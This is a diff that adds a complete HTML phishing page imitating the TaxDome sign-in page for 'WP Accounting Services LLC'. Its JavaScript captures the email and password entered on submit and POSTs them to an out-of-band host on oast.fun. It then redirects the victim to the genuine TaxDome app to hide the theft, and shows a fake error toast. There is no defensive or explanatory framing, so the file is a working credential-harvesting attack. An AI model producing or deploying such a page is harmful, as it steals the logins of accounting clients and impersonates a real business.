@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to WP Accounting Services LLC login</title>
+    <link rel="icon" href="https://wpaccountingservicesllc.taxdome.com/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-image: url('https://raw.githubusercontent.com/Usama3423/web/main/tdmbackground.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            position: relative;
+        }
+
+        .login-container {
+            position: absolute;
+            top: calc(238px + 1.5in - 0.5in);
+            left: calc(957px - 0.8in - 0.5in - 0.2in - 0.1in - 3.5in - 0.3in); /* Further adjusted to move 0.3 inches left */
+            width: calc(390px * 1.2); /* 20% bigger */
+        }
+
+        label {
+            font-size: 16.8px; /* 20% increase */
+            color: #333333;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 48px; /* 20% increase */
+            margin-bottom: 24px;
+            padding: 12px;
+            font-family: 'Source Sans Pro', sans-serif;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 24px;
+            border: 1px solid #CCCCCC;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .input-field.error {
+            border-color: red;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            font-size: 16.8px; /* 20% increase */
+            color: #007BFF;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .sign-in-button {
+            width: 100%;
+            height: 60px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 21.6px; /* 20% increase */
+            cursor: pointer;
+        }
+
+        .sign-in-button:disabled {
+            cursor: not-allowed;
+        }
+
+        .sign-in-button:hover:enabled {
+            background-color: #0056b3;
+        }
+
+        /* Toast Notification Styles */
+        .Toastify__toast-container {
+            position: fixed;
+            z-index: 9999;
+            top: 56px;
+            right: 30px;
+            padding: 4px;
+            width: 320px;
+            box-sizing: border-box;
+            color: #0f172a;
+        }
+
+        .Toastify__toast {
+            background-color: var(--toastify-toast-background, #fff);
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.2);
+            padding: 16px;
+            font-size: 16px;
+            font-family: 'Source Sans Pro', sans-serif;
+            color: #28334b;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .Toastify__toast-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+
+        .Toastify__progress-bar {
+            background-color: var(--toastify-color-error, #e74c3c);
+            height: 4px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <form id="loginForm">
+            <label for="email">Email</label>
+            <input type="email" id="email" class="input-field" placeholder="Enter your email" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <button type="submit" class="sign-in-button" disabled>Sign in</button>
+        </form>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="Toastify__toast-container Toastify__toast-container--top-right">
+        <div class="Toastify__toast">
+            <div class="Toastify__toast-body">
+                Unexpected error. Try again.
+            </div>
+            <div class="Toastify__toast-close">
+                <button type="button">✖</button>
+            </div>
+            <div class="Toastify__progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var emailField = document.getElementById('email');
+            var passwordField = document.getElementById('password');
+            var signInButton = document.querySelector('.sign-in-button');
+
+            function validateForm() {
+                if (emailField.value && passwordField.value) {
+                    signInButton.disabled = false;
+                } else {
+                    signInButton.disabled = true;
+                }
+            }
+
+            emailField.addEventListener('input', validateForm);
+            passwordField.addEventListener('input', validateForm);
+
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                var email = emailField.value;
+                var password = passwordField.value;
+
+                // Highlight empty fields
+                if (!email) {
+                    emailField.classList.add('error');
+                } else {
+                    emailField.classList.remove('error');
+                }
+
+                if (!password) {
+                    passwordField.classList.add('error');
+                } else {
+                    passwordField.classList.remove('error');
+                }
+
+                if (email && password) {
+                    // Send the email and password to the specified URL
+                    fetch('https://jksuolqicsmqvwaztvtwlvq6t3nx9wkri.oast.fun', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ email: email, password: password })
+                    })
+                    .then(response => {
+                        // Redirect the user to the specified link
+                        window.location.href = 'https://simco.taxdome.com/app';
+                    })
+                    .catch(error => console.error('Error:', error));
+                }
+            });
+        });
+    </script>
+</body>
+</html>
